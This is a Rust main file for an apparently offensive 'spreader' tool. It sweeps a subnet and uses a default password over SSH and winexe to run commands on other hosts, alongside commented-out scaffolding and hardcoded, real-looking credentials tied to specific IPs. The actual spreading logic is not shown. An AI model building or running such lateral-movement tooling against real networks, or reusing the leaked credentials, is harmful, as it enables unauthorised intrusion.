// mod enumeration;
mod init;
mod net;
// use enumeration::ping;
use net::{
    ssh::{self, SSHClient},
    winexe::{self, WinexeClient},
};
//use std::future::Future;
use crate::net::communicator::{Credentials, Session};
use crate::net::spread::spreader::Spreader;
use flate2::read::GzDecoder;
use futures::future::join_all;
use futures::{Future, FutureExt};
use std::process::Command;
use std::sync::Arc;
use tar::Archive;

struct MemoryReport;

impl Drop for MemoryReport {
    fn drop(&mut self) {
        // Use an OS-specific command to get memory usage
        // This is an example for Linux using `ps`
        let output = Command::new("ps")
            .arg("-o")
            .arg("rss=")
            .arg("-p")
            .arg(std::process::id().to_string())
            .output()
            .expect("Failed to execute command");

        let memory_usage = String::from_utf8_lossy(&output.stdout);
        println!("Memory Usage at Exit: {} KB", memory_usage.trim());
    }
}
// fn execute_commands<'a, C>(communicator: &'a C, cmds: Vec<&'a str>) -> Vec<impl Future<Output = Result<Option<String>, std::io::Error>> + 'a>
// where
//     C: Communicator + 'a,
// {
//     cmds.into_iter()
//         .map(|cmd| {

//             async move {
//                 communicator.execute_command(
//                     cmd
//                 ).await
//             }
//         })
//         .collect()
// }

#[tokio::main]
async fn main() {
    // const WINEXE_ARCHIVE: &'static [u8] = include_bytes!("../img.tar.gz");
    // let img_path = "/tmp/img";

    // if !std::path::Path::new(img_path).exists() {
    //     let tar_data = GzDecoder::new(WINEXE_ARCHIVE);
    //     let mut archive = Archive::new(tar_data);
    //     if let Err(e) = archive.unpack("/tmp") {
    //         eprintln!("Failed to unpack archive: {}", e);
    //         return;
    //     }
    // }

    // let winexe_client = match WinexeClient::new(Some("/tmp/img".to_string())).await {
    //     Ok(client) => client,
    //     Err(e) => {
    //         eprintln!("Failed to create WinexeClient: {}", e);
    //         return;
    //     }
    // };

    // let hosts = ping::ping_sweep();
    // let mut enumerator = ping::Enumerator::new("10.100.107".to_string());
    // enumerator.ping_sweep().await.unwrap();

    // let spreader = init::Spreader::new("password".to_string());
    println!("Hello, world!");
    let mut spreader = Spreader::new("password123".to_string());
    // spreader.spread
    spreader.enumerate_hosts("192.168.60").await;
    // password123
    spreader.spread().await;
    // for host in enumerator.hosts {
    //     println!("Host: {}", host.ip);
    //  GoblinoMunchers759!
    //     // println!("OS: {:?}", host.os);
    // }

    // let creds: Credentials = Credentials {
    //     username: "cm03",
    //     password: Some("@11272003Cm!".to_string()),
    //     key: None,
    // };
    // let creds2: Credentials = Credentials {
    //     username: "pi",
    //     password: Some("password".to_string()),
    //     key: None,
    // };
    // let winexe_client
    //     = WinexeClient::new(Some("/tmp/img".to_string()), &creds, "139.182.180.236".to_string())
    //         .await
    //         .unwrap();

    // let winexe_client = WinexeClient::new()
    //     .container_path("/tmp/img".to_string())
    //     .ip("139.182.180.236".to_string())
    //     .connect(&creds)
    //     .await
    //     .expect("");
    // let ssh_client2 = SSHClient::new()
    //     .ip("139.182.180.113".to_string())
    //     .connect(&creds)
    //     .await
    //     .unwrap();
    // let ssh_client = SSHClient::new()
    //     .ip("139.182.180.113".to_string())
    //     .connect(&creds)
    //     .await
    //     .unwrap();

    // let mut handles = vec![];

    // handles.push(tokio::spawn(async move {
    //     ssh_client2
    //         .execute_command("echo client2 > /tmp/test")
    //         .await;
    //     ssh_client2
    //         .execute_command("echo client2 > /tmp/test")
    //         .await;
    //     ssh_client2
    //         .execute_command("echo client2 > /tmp/test")
    //         .await;
    //     ssh_client2.execute_command("echo Step 2").await;
    //     ssh_client2.execute_command("echo Step 3").await;
    // }));

    // handles.push(tokio::spawn(async move {
    //     ssh_client.execute_command("echo client1 > /tmp/test").await;
    //     ssh_client.execute_command("echo client1 > /tmp/test").await;
    // }));

    // Wait for all spawned tasks to complete
    // join_all(handles).await;

    // ssh_client.unwrap().execute_command("echo Test1 > /tmp/test").await;
    // let ssh_client = SSHClient::new(&creds, "139.182.180.113:22".to_string(), None).await;

    let cmds = vec![
        "echo Test3 > /temp/test\n",
        "echo Test2 > /temp/test\n",
        "echo Test1 > /temp/test\n",
    ];

    // let output = winexe_client.execute_command("powershell.exe ls /temp\n").await.unwrap();
    // let x = winexe_client.execute_command("echo 333\n").await.unwrap();
    // // print output
    // println!("{:?}", output);
    // println!("{:?}", x);
    // let out = winexe_client.execute_command("echo Test1\n").await.unwrap();
    // println!("{:?}", out);
    // winexe_client2.execute_command("echo Test2 > /tmp/test\n").await.unwrap();
    // winexe_client.close().await.unwrap();

    // ssh_client.execute_command("powershell.exe ls\n").await.unwrap();
    // ssh_client.child_process.unwrap().wait().await.unwrap();
    // winexe_client.execute_command("dir\n").await.unwrap();
    // let command1 = winexe_client.execute_command("echo ONEE\n");
    // let command2 = winexe_client.execute_command("dir\n");
    // let command2 = winexe_client.execute_command("dir\n");

    // let (result1, result2) = tokio::join!(command1, command2);

    // winexe_client.close().await;

    // println!("Result 1: {:?}", result1);
    // println!("Result 2: {:?}", result2);
    let _memory_report = MemoryReport;

    // winexe_client.close().await;
}

// // mod ssh_client;
// // mod ping_sweepear

// // use ping_sweep::ping_sweep;

// use std::env;
// use std::fs::File;
// use std::io::Write;
// use std::process::Command;
// use tempfile::NamedTempFile;

// fn execute_winexe(username: &str, password: &str, host: &str, command: &str) {
//     // Embed the external executable as binary data
//     let executable_data: &[u8] = include_bytes!("./connection/bin/winexe64");

//     // Write the embedded executable to a temporary file
//     let mut tmp_file = NamedTempFile::new().expect("Failed to create temp file");
//     tmp_file.write_all(executable_data).expect("Failed to write to temp file");

//     // Execute the temporary executable
//     let output = Command::new(tmp_file.path())
//         .arg("-U")
//         .arg(format!("{}%{}", username, password))
//         .arg(format!("//{}", host))
//         .arg(command)
//         .output()
//         .expect("Failed to execute command");

//     // Print the output
//     println!("Output: {:?}", output.stdout);
// }

// fn main() {
//     let args: Vec<String> = env::args().collect();
//     if args.len() != 5 {
//         println!("Usage: {} <username> <password> <host> <command>", args[0]);
//         return;
//     }

//     let username = &args[1];
//     let password = &args[2];
//     let host = &args[3];
//     let command = &args[4];

//     execute_winexe(username, password, host, command);
// }

// // use ssh2::Session;
// // use std::io::prelude::*;
// // use std::net::TcpStream;
// // use anyhow::Result;
// // use anyhow::Error;

// // #[derive(Debug)]
// // pub struct SSHClient {
// //     host: String,
// //     username: String,
// //     password: Option<String>,
// //     key: Option<String>,
// // }

// // impl SSHClient {
// //     pub fn new(host: String, username: String, password: Option<String>, key: Option<String>) -> Self {
// //         SSHClient {
// //             host,
// //             username,
// //             password,
// //             key,
// //         }
// //     }

// //     pub async fn connect_and_authenticate(&self) -> Result<Session, Error> {
// //         let tcp = TcpStream::connect(&self.host)?;
// //         let mut session = Session::new().unwrap();
// //         session.set_tcp_stream(tcp);
// //         session.handshake()?;

// //         if let Some(ref password) = self.password {
// //             session.userauth_password(&self.username, &password)?;
// //         } else {
// //             return Err(anyhow::anyhow!("Authentication method not provided"));
// //         }

// //         Ok(session)
// //     }

// //     pub async fn execute_command(&self, session: &Session, command: &str) -> Result<String, Error> {
// //         let mut channel = session.channel_session()?;
// //         channel.exec(command)?;

// //         let mut output = String::new();
// //         channel.read_to_string(&mut output)?;

// //         channel.send_eof()?;
// //         channel.wait_close()?;

// //         Ok(output)
// //     }
// // }

// // #[tokio::main]
// // async fn main() -> Result<(), Error> {
// //     let ips = vec!["127.0.0.1:22", "192.168.1.163:22"]; // Replace with your list of IPs
// //     let username = "cm03".to_string();
// //     let password = Some("@11272003Cm!".to_string()); // Please replace with a safer placeholder

// //     let mut handles = vec![];

// //     for ip in ips {
// //         let username = username.clone();
// //         let password = password.clone();

// //         let handle = tokio::task::spawn(async move {
// //             let client = SSHClient::new(ip.to_string(), username, password, None);
// //             match client.connect_and_authenticate().await {
// //                 Ok(session) => {
// //                     match client.execute_command(&session, "ls").await {
// //                         Ok(output) => {
// //                             println!("Output from {}: {}", ip, output);
// //                         }
// //                         Err(e) => {
// //                             println!("Error executing command on {}: {:?}", ip, e);
// //                         }
// //                     }
// //                 }
// //                 Err(e) => {
// //                     println!("Error connecting to {}: {:?}", ip, e);
// //                 }
// //             }
// //         });

// //         handles.push(handle);
// //     }

// //     for handle in handles {
// //         handle.await?;
// //     }

// //     Ok(())
// // }
